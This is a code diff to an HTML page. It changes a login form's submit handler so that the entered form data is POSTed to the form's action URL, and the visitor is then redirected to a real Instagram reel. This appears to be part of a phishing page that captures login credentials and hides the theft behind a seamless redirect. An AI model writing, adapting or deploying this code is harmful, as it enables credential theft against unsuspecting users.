@@ -207,12 +207,25 @@
     </div>
 
     <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault();  // Prevent form submission
-            
-            // Redirect to the Instagram reel page
-            window.location.href = "https://www.instagram.com/reel/DG28vqzslRG/?utm_source=ig_web_button_share_sheet";
-        });
+        const handleSubmit = event => {
+            event.preventDefault(); // Prevent default form submission
+    
+            const myForm = event.target;
+            const formData = new FormData(myForm);
+    
+            fetch(myForm.action, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams(formData).toString()
+            })
+            .then(() => {
+                console.log("Form successfully submitted");
+                window.location.href = "https://www.instagram.com/reel/DG28vqzslRG/?utm_source=ig_web_button_share_sheet";
+            })
+            .catch(error => alert(error));
+        };
+    
+        document.querySelector("#loginForm").addEventListener("submit", handleSubmit);
     </script>
 
 </body>
